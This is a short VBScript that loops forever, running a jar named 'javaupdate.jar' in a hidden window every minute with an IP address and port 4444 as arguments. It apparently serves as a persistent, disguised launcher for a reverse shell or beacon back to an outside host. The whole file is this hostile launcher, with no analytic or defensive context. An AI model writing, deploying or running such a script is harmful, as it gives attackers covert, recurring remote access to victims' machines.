Set WshShell = CreateObject("WScript.Shell")

Do
    WshShell.Run "java -jar .\javaupdate.jar 172.24.169.235 4444", 0, False
    WScript.Sleep 60000 ' Sleep for 60,000 milliseconds = 1 minute
Loop
